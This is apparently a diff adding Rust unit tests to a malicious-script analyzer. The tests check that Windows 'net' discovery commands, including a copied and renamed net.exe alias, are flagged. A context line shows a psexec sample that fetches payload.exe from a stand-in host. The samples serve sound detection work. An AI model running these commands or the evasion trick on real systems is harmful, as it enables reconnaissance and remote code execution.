@@ -4121,6 +4121,68 @@ C:\Users\Public\qp.tmp *
     }
 
     #[test]
+    fn net_discovery_commands_emit_enumeration_traits() {
+        let report = analyze(
+            br#"net accounts
+net config workstation
+net share
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        for (kind, command) in [
+            ("net-accounts", "net accounts"),
+            ("net-config", "net config workstation"),
+            ("net-share", "net share"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command: c }
+                        if enum_kind == kind && c == command
+                )),
+                "missing net discovery enumeration {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn copied_net_alias_discovery_commands_emit_enumeration_traits() {
+        let script = br#"copy C:\Windows\System32\net.exe C:\Users\Public\net.tmp
+C:\Users\Public\net.tmp accounts
+C:\Users\Public\net.tmp config server
+C:\Users\Public\net.tmp share
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\net.tmp"#)
+            )),
+            "copied net discovery alias was not surfaced: {:?}",
+            report.traits
+        );
+        for (kind, command) in [
+            ("net-accounts", "net.exe accounts"),
+            ("net-config", "net.exe config server"),
+            ("net-share", "net.exe share"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command: c }
+                        if enum_kind == kind && c == command
+                )),
+                "missing copied net discovery enumeration {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
